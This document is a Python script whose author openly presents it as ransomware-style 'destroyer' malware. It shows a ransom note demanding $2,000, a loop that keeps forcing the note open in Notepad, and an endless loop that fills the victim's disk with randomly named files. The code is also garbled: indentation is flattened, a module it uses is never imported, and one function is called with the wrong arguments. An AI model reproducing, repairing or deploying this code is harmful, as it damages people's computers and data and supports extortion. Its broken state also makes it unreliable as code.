import os, sys, win32gui, subprocess, random
note = ("""
 Hi my name is @Radiationbolt this is one of my best creation a destroyer I hope you watched terminator well this will as him and destroy unlike the film they won't be any hero to save you 
 your PC / Desktop will run slow like a snail many files will be created to full your storage more and more file holding the same message and only way to save you PC is to pay me a ransom elsewhere say good bye to that PC 
 ransom : 2 000$
 Love y'a 
 your friend @Radiationbolt
 """)
def wish(note):
 try:
 open("radtaren.wish.txt", "r")
 except:
 f = open("radtaren.wish.txt", "w").write(note)
 else:
 ransom = subprocess.Popen(['notepad.exe', 'radtaren.wish.txt'])
 count = 0 # Debugging/Testing
 while True:
          time.sleep(0.1)
          top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
          if top_window == 'radtaren.wish - Notepad':
              pass
          else:
           time.sleep(0.1)
           ransom.kill()
           time.sleep(0.1)
           ransom = subprocess.Popen(['notepad.exe', 'radtaren.wish.txt'])
           time.sleep(10)
           count +=1
           if count == 5:
              break
def trash():
 
 print("fun begin")
 #found in wordlap : github.com/XnetwolfX/Wordlap
 alpha = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM+×÷=%/\$€£@*!#:;&_()-',.?￦¥°¿¡^[]<>~`§μ¬Г´·{}©|¤₹៛₪﷼฿Ωθฯ"
 start = 0
 t = ""
 while start == 0:
 r = random.choice(alpha)
 t = t + r
 if len(t) == 7:
 d = open(t, "w").write(note)
 t = ""
def destroy(note):
            #startup(True)
            print("my creator wish")
            wish(note)
            print("add trash to storage")
            trash(note)
            #print("launch random program")
            #launch()# coming soon
destroy(note)         
#XnetwolfX #Xnetwolf
